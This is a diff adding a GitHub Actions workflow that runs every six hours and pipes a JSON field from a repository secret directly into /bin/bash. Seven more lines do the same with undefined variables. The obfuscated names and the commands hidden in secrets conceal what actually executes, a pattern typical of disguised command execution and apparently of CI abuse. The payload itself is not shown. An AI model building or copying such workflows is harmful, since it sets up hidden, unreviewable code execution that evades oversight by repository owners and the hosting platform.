@@ -1,0 +1,26 @@
+name: tianmingstm
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tianmingstm
+        env:
+          usl409: ${{ secrets.usl409 }}
+        run: |
+          echo $usl409 | jq -r .zxq01 | /bin/bash
+          echo $hus2711 | jq -r .f74459 | /bin/bash
+          echo $zzg05 | jq -r .ttgl26 | /bin/bash
+          echo $kh1632 | jq -r .gar22563 | /bin/bash
+          echo $mru85909 | jq -r .cn9 | /bin/bash
+          echo $plev86617 | jq -r .jeq45 | /bin/bash
+          echo $lu15 | jq -r .gplob4644 | /bin/bash
+          echo $x47233 | jq -r .aojxw726 | /bin/bash
+
